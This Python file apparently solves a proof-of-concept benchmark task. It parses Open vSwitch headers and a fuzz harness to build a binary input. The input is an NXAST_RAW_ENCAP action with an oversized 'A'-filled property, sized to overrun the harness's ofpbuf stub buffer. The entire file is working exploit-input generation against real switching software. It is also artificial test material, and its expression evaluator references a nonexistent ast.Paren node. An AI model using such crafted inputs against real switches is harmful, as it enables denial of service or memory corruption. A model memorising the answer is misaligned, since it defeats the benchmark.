import os
import re
import ast
import tarfile
from typing import Dict, Optional, Tuple, List, Iterable


def _strip_c_comments(s: str) -> str:
    s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
    s = re.sub(r'//.*?$', '', s, flags=re.M)
    return s


def _round_up(n: int, m: int) -> int:
    return (n + (m - 1)) // m * m


_ALLOWED_BINOPS = {
    ast.Add: lambda a, b: a + b,
    ast.Sub: lambda a, b: a - b,
    ast.Mult: lambda a, b: a * b,
    ast.FloorDiv: lambda a, b: a // b,
    ast.Div: lambda a, b: a // b,
    ast.Mod: lambda a, b: a % b,
    ast.LShift: lambda a, b: a << b,
    ast.RShift: lambda a, b: a >> b,
    ast.BitOr: lambda a, b: a | b,
    ast.BitAnd: lambda a, b: a & b,
    ast.BitXor: lambda a, b: a ^ b,
}

_ALLOWED_UNOPS = {
    ast.UAdd: lambda a: +a,
    ast.USub: lambda a: -a,
    ast.Invert: lambda a: ~a,
}


def _safe_eval_int_expr(expr: str, names: Dict[str, int]) -> int:
    expr = expr.strip()
    if not expr:
        raise ValueError("empty expr")
    expr = re.sub(r'(?<=\w)[uUlL]+\b', '', expr)

    node = ast.parse(expr, mode='eval').body

    def ev(n):
        if isinstance(n, ast.Constant):
            if isinstance(n.value, (int, bool)):
                return int(n.value)
            raise ValueError("bad constant")
        if isinstance(n, ast.Num):
            return int(n.n)
        if isinstance(n, ast.Name):
            if n.id in names:
                return int(names[n.id])
            raise ValueError(f"unknown name {n.id}")
        if isinstance(n, ast.BinOp):
            op_t = type(n.op)
            if op_t in _ALLOWED_BINOPS:
                return _ALLOWED_BINOPS[op_t](ev(n.left), ev(n.right))
            raise ValueError("bad binop")
        if isinstance(n, ast.UnaryOp):
            op_t = type(n.op)
            if op_t in _ALLOWED_UNOPS:
                return _ALLOWED_UNOPS[op_t](ev(n.operand))
            raise ValueError("bad unop")
        if isinstance(n, ast.Paren):
            return ev(n.value)
        raise ValueError("bad expr node")

    return int(ev(node))


def _extract_numeric_defines(text: str) -> Dict[str, int]:
    out: Dict[str, int] = {}
    for line in text.splitlines():
        if not line.lstrip().startswith("#"):
            continue
        m = re.match(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$', line)
        if not m:
            continue
        name = m.group(1)
        val = m.group(2).strip()
        val = val.split('/*', 1)[0].split('//', 1)[0].strip()
        if not val:
            continue
        val = val.strip()
        if val.startswith("(") and val.endswith(")"):
            val = val[1:-1].strip()
        if "(" in val and ")" in val and re.match(r'^\w+\s*\(', val):
            continue
        try:
            v = _safe_eval_int_expr(val, out)
        except Exception:
            try:
                v = int(val, 0)
            except Exception:
                continue
        out[name] = int(v)
    return out


def _extract_enum_constants(text: str, enum_name: str, known: Dict[str, int]) -> Dict[str, int]:
    text_nc = _strip_c_comments(text)
    m = re.search(r'\benum\s+' + re.escape(enum_name) + r'\b', text_nc)
    if not m:
        return {}
    i = m.end()
    brace = text_nc.find("{", i)
    if brace < 0:
        return {}
    depth = 0
    j = brace
    while j < len(text_nc):
        if text_nc[j] == "{":
            depth += 1
        elif text_nc[j] == "}":
            depth -= 1
            if depth == 0:
                break
        j += 1
    if depth != 0:
        return {}
    body = text_nc[brace + 1:j]
    parts: List[str] = []
    cur = []
    par = 0
    for ch in body:
        if ch == "(":
            par += 1
        elif ch == ")":
            par = max(0, par - 1)
        if ch == "," and par == 0:
            parts.append("".join(cur).strip())
            cur = []
        else:
            cur.append(ch)
    if cur:
        parts.append("".join(cur).strip())

    vals: Dict[str, int] = {}
    current = -1
    names = dict(known)
    names.update(vals)
    for p in parts:
        p = p.strip()
        if not p:
            continue
        p = re.sub(r'\b__attribute__\s*\(\(.*?\)\)', '', p).strip()
        p = re.sub(r'\bOVS_PACKED\b', '', p).strip()
        p = p.strip()
        if not p:
            continue
        if "=" in p:
            nm, ex = p.split("=", 1)
            nm = nm.strip()
            ex = ex.strip()
            if not re.match(r'^[A-Za-z_]\w*$', nm):
                continue
            try:
                v = _safe_eval_int_expr(ex, names)
            except Exception:
                try:
                    v = int(ex, 0)
                except Exception:
                    continue
            vals[nm] = int(v)
            current = int(v)
        else:
            nm = p.strip()
            if not re.match(r'^[A-Za-z_]\w*$', nm):
                continue
            current += 1
            vals[nm] = int(current)
        names[nm] = vals[nm]
    return vals


def _extract_struct_block(text: str, struct_name: str) -> Optional[str]:
    text_nc = _strip_c_comments(text)
    m = re.search(r'\bstruct\s+' + re.escape(struct_name) + r'\b', text_nc)
    if not m:
        return None
    i = m.end()
    brace = text_nc.find("{", i)
    if brace < 0:
        return None
    depth = 0
    j = brace
    while j < len(text_nc):
        if text_nc[j] == "{":
            depth += 1
        elif text_nc[j] == "}":
            depth -= 1
            if depth == 0:
                return text_nc[brace + 1:j]
        j += 1
    return None


def _type_size(type_str: str, struct_sizes: Dict[str, int]) -> Optional[int]:
    t = type_str.strip()
    t = re.sub(r'\bconst\b', '', t).strip()
    t = re.sub(r'\bvolatile\b', '', t).strip()
    t = t.replace("*", " ").strip()
    t = re.sub(r'\s+', ' ', t)

    prim = {
        "uint8_t": 1,
        "int8_t": 1,
        "char": 1,
        "unsigned char": 1,
        "uint16_t": 2,
        "int16_t": 2,
        "ovs_be16": 2,
        "be16": 2,
        "uint32_t": 4,
        "int32_t": 4,
        "ovs_be32": 4,
        "be32": 4,
        "uint64_t": 8,
        "int64_t": 8,
        "ovs_be64": 8,
        "be64": 8,
    }
    if t in prim:
        return prim[t]
    if t.startswith("struct "):
        sn = t.split(" ", 1)[1].strip()
        if sn in struct_sizes:
            return struct_sizes[sn]
        return None
    if t in struct_sizes:
        return struct_sizes[t]
    return None


def _parse_struct_layout(text: str, struct_name: str, constants: Dict[str, int], struct_sizes: Dict[str, int]) -> Tuple[int, Dict[str, Tuple[int, int]]]:
    block = _extract_struct_block(text, struct_name)
    if block is None:
        raise ValueError(f"struct {struct_name} not found")

    decls = [d.strip() for d in block.split(";")]
    offset = 0
    fields: Dict[str, Tuple[int, int]] = {}

    for d in decls:
        if not d:
            continue
        d = re.sub(r'\bOVS_PACKED\b', '', d).strip()
        d = re.sub(r'\b__attribute__\s*\(\(.*?\)\)', '', d).strip()
        if not d:
            continue
        if d.startswith("#"):
            continue
        if d.startswith("union ") or d.startswith("enum ") or d.startswith("typedef ") or d.startswith("struct {"):
            continue
        d = re.sub(r'\s+', ' ', d).strip()

        m = re.match(r'^(.*?)\s+([A-Za-z_]\w*)\s*(\[(.*?)\])?\s*$', d)
        if not m:
            continue
        type_str = m.group(1).strip()
        name = m.group(2).strip()
        arr = m.group(4)

        if arr is not None:
            arr = arr.strip()
            if arr == "" or arr == "0":
                count = 0
            else:
                try:
                    count = int(_safe_eval_int_expr(arr, constants), 10) if isinstance(arr, str) else int(arr)
                except Exception:
                    try:
                        count = int(arr, 0)
                    except Exception:
                        count = 0
        else:
            count = 1

        sz = _type_size(type_str, struct_sizes)
        if sz is None:
            continue

        total_sz = sz * max(0, count)
        fields[name] = (offset, total_sz)
        offset += total_sz

    return offset, fields


class _SourceReader:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self.is_dir = os.path.isdir(src_path)
        self._tar = None
        if not self.is_dir:
            self._tar = tarfile.open(src_path, mode="r:*")

    def close(self):
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass
            self._tar = None

    def iter_text_files(self, max_size: int = 2_000_000) -> Iterable[Tuple[str, str]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".in")
        if self.is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    if not fn.endswith(exts):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                    except OSError:
                        continue
                    if st.st_size > max_size:
                        continue
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    rel = os.path.relpath(path, self.src_path)
                    yield rel, text
        else:
            assert self._tar is not None
            for m in self._tar.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not name.endswith(exts):
                    continue
                if m.size > max_size:
                    continue
                try:
                    f = self._tar.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                yield name, text

    def read_first_matching(self, predicate) -> Optional[Tuple[str, str]]:
        for name, text in self.iter_text_files():
            if predicate(name, text):
                return name, text
        return None


def _set16(buf: bytearray, off: int, val: int) -> None:
    buf[off:off + 2] = bytes([(val >> 8) & 0xff, val & 0xff])


def _set32(buf: bytearray, off: int, val: int) -> None:
    buf[off:off + 4] = bytes([(val >> 24) & 0xff, (val >> 16) & 0xff, (val >> 8) & 0xff, val & 0xff])


def _find_nicira_ext_header(reader: _SourceReader) -> Optional[str]:
    candidates: List[str] = []
    for name, text in reader.iter_text_files():
        base = os.path.basename(name)
        if base == "nicira-ext.h":
            candidates.append(text)
    if candidates:
        candidates.sort(key=len, reverse=True)
        return candidates[0]
    for _, text in reader.iter_text_files():
        if "NX_VENDOR_ID" in text and "NXAST_" in text and "nicira" in text.lower():
            return text
    return None


def _find_harness_stub_size(reader: _SourceReader) -> int:
    stub_default = 64
    fuzzer_files: List[Tuple[str, str]] = []
    for name, text in reader.iter_text_files(max_size=1_000_000):
        if "LLVMFuzzerTestOneInput" in text:
            fuzzer_files.append((name, text))
    if not fuzzer_files:
        return stub_default

    scored = []
    for name, text in fuzzer_files:
        score = 0
        if "ofpacts" in text or "ofp_actions" in text or "ofp-actions" in text or "ofp_actions" in name or "ofp-actions" in name:
            score += 10
        if "ofpacts_decode" in text or "ofpacts_pull" in text or "ofp_actions_decode" in text:
            score += 20
        scored.append((score, name, text))
    scored.sort(reverse=True)
    _, _, htext = scored[0]

    m = re.search(r'OFPBUF_STUB_INITIALIZER\s*\([^,]+,\s*([0-9]+)\s*\)', htext)
    if m:
        try:
            return int(m.group(1), 0)
        except Exception:
            pass

    m = re.search(r'ofpbuf_use_stub\s*\(\s*&\w+\s*,\s*(\w+)\s*,\s*sizeof\s*\(\s*\1\s*\)\s*\)', htext)
    if m:
        arr = m.group(1)
        mm = re.search(r'\b(uint8_t|uint16_t|uint32_t|uint64_t|char)\s+' + re.escape(arr) + r'\s*\[\s*([0-9]+)\s*\]\s*;', htext)
        if mm:
            ty = mm.group(1)
            ln = int(mm.group(2), 0)
            tsz = {"uint8_t": 1, "char": 1, "uint16_t": 2, "uint32_t": 4, "uint64_t": 8}.get(ty, 1)
            return ln * tsz

    return stub_default


def _harness_prefix_len(reader: _SourceReader) -> int:
    fuzzer_files: List[Tuple[str, str]] = []
    for name, text in reader.iter_text_files(max_size=1_000_000):
        if "LLVMFuzzerTestOneInput" in text:
            fuzzer_files.append((name, text))
    if not fuzzer_files:
        return 0

    best = None
    best_score = -1
    for name, text in fuzzer_files:
        score = 0
        if "ofpacts" in text or "ofp-actions" in text or "ofp_actions" in text:
            score += 10
        if "FuzzedDataProvider" in text:
            score += 5
        if score > best_score:
            best_score = score
            best = text
    if best is None:
        return 0

    if "FuzzedDataProvider" not in best:
        return 0

    pref = 0
    for m in re.finditer(r'ConsumeIntegral(?:InRange)?\s*<\s*(u?int8_t|u?int16_t|u?int32_t|u?int64_t)\s*>\s*\(', best):
        ty = m.group(1)
        pref += {"uint8_t": 1, "int8_t": 1, "uint16_t": 2, "int16_t": 2, "uint32_t": 4, "int32_t": 4, "uint64_t": 8, "int64_t": 8}.get(ty, 0)
        if pref >= 16:
            break
    if pref == 0:
        if re.search(r'ConsumeIntegralInRange\s*<\s*(u?int8_t)\s*>', best) or re.search(r'ConsumeIntegral\s*<\s*(u?int8_t)\s*>', best):
            pref = 1
    return pref


class Solution:
    def solve(self, src_path: str) -> bytes:
        reader = _SourceReader(src_path)
        try:
            nicira_text = _find_nicira_ext_header(reader)
            constants: Dict[str, int] = {}
            nx_vendor = 0x00002320
            nxast_raw_encap = None

            if nicira_text:
                constants.update(_extract_numeric_defines(nicira_text))
                if "NX_VENDOR_ID" in constants:
                    nx_vendor = int(constants["NX_VENDOR_ID"])
                if "NXAST_RAW_ENCAP" in constants:
                    nxast_raw_encap = int(constants["NXAST_RAW_ENCAP"])
                if nxast_raw_encap is None:
                    enums = _extract_enum_constants(nicira_text, "nx_action_subtype", constants)
                    if "NXAST_RAW_ENCAP" in enums:
                        nxast_raw_encap = int(enums["NXAST_RAW_ENCAP"])
                    else:
                        enums2 = _extract_enum_constants(nicira_text, "nx_action_subtype", {**constants, **enums})
                        if "NXAST_RAW_ENCAP" in enums2:
                            nxast_raw_encap = int(enums2["NXAST_RAW_ENCAP"])

            if nxast_raw_encap is None:
                found = None
                for _, text in reader.iter_text_files(max_size=2_000_000):
                    if "NXAST_RAW_ENCAP" not in text:
                        continue
                    d = _extract_numeric_defines(text)
                    if "NXAST_RAW_ENCAP" in d:
                        found = int(d["NXAST_RAW_ENCAP"])
                        break
                    e = _extract_enum_constants(text, "nx_action_subtype", d)
                    if "NXAST_RAW_ENCAP" in e:
                        found = int(e["NXAST_RAW_ENCAP"])
                        break
                if found is not None:
                    nxast_raw_encap = found
                else:
                    nxast_raw_encap = 0

            stub_size = _find_harness_stub_size(reader)
            prefix_len = _harness_prefix_len(reader)

            struct_sizes: Dict[str, int] = {}
            nx_header_offs = {"type": 0, "len": 2, "vendor": 4, "subtype": 8}
            if nicira_text:
                try:
                    sz, fields = _parse_struct_layout(nicira_text, "nx_action_header", constants, struct_sizes)
                    if sz > 0:
                        struct_sizes["nx_action_header"] = sz
                        type_field = None
                        len_field = None
                        vendor_field = None
                        subtype_field = None
                        for fn, (fo, fs) in fields.items():
                            if fn == "type" and fs == 2:
                                type_field = fo
                            elif fn == "len" and fs == 2:
                                len_field = fo
                            elif ("vendor" in fn or "experimenter" in fn) and fs == 4:
                                vendor_field = fo
                            elif fn == "subtype" and fs == 2:
                                subtype_field = fo
                        if type_field is not None:
                            nx_header_offs["type"] = type_field
                        if len_field is not None:
                            nx_header_offs["len"] = len_field
                        if vendor_field is not None:
                            nx_header_offs["vendor"] = vendor_field
                        if subtype_field is not None:
                            nx_header_offs["subtype"] = subtype_field
                except Exception:
                    pass

            base_size = 24
            raw_header_field_off = 0
            raw_packet_type_field: Optional[Tuple[int, int]] = None
            if nicira_text:
                if "nx_action_header" not in struct_sizes:
                    struct_sizes["nx_action_header"] = 16
                try:
                    sz, fields = _parse_struct_layout(nicira_text, "nx_action_raw_encap", constants, struct_sizes)
                    if sz >= 16:
                        base_size = sz
                        header_field_name = None
                        for fn, (fo, fs) in fields.items():
                            if fs == struct_sizes.get("nx_action_header", 16):
                                header_field_name = fn
                                raw_header_field_off = fo
                                break
                        if header_field_name is None:
                            raw_header_field_off = 0

                        for fn, (fo, fs) in fields.items():
                            if ("packet_type" in fn or "new_packet_type" in fn) and fs in (2, 4):
                                raw_packet_type_field = (fo, fs)
                                break
                except Exception:
                    base_size = 24
                    raw_header_field_off = 0
                    raw_packet_type_field = None

            base_size = _round_up(max(16, base_size), 8)

            min_total = base_size + 16
            desired_total = max(min_total, stub_size + 8)
            total_len = _round_up(desired_total, 8)

            max_total = 0xFFFF
            if total_len > max_total:
                total_len = _round_up(max_total, 8)
                if total_len > max_total:
                    total_len = max_total & ~7

            prop_len = total_len - base_size
            if prop_len < 16:
                prop_len = 16
                total_len = base_size + prop_len
                total_len = _round_up(total_len, 8)
                prop_len = total_len - base_size

            prop_len = _round_up(prop_len, 8)
            total_len = base_size + prop_len
            if total_len > max_total:
                total_len = max_total & ~7
                prop_len = total_len - base_size
                prop_len = (prop_len // 8) * 8
                if prop_len < 16:
                    prop_len = 16
                    total_len = base_size + prop_len
                    total_len = _round_up(total_len, 8)
                    prop_len = total_len - base_size

            action = bytearray(b"\x00" * base_size)
            h_off = raw_header_field_off
            _set16(action, h_off + nx_header_offs["type"], 0xFFFF)
            _set16(action, h_off + nx_header_offs["len"], total_len)
            _set32(action, h_off + nx_header_offs["vendor"], nx_vendor)
            _set16(action, h_off + nx_header_offs["subtype"], nxast_raw_encap & 0xFFFF)

            if raw_packet_type_field is not None:
                pto, pts = raw_packet_type_field
                if pts == 4 and pto + 4 <= len(action):
                    _set32(action, pto, 0x00000800)
                elif pts == 2 and pto + 2 <= len(action):
                    _set16(action, pto, 0x0800)

            prop = bytearray(b"A" * prop_len)
            _set16(prop, 0, 0xFFFF)
            _set16(prop, 2, prop_len)
            _set32(prop, 4, nx_vendor)
            _set32(prop, 8, 0)

            payload = bytes(action + prop)
            if prefix_len > 0:
                prefix = bytearray(b"\x00" * prefix_len)
                prefix[0] = 6
                payload = bytes(prefix) + payload
            return payload
        finally:
            reader.close()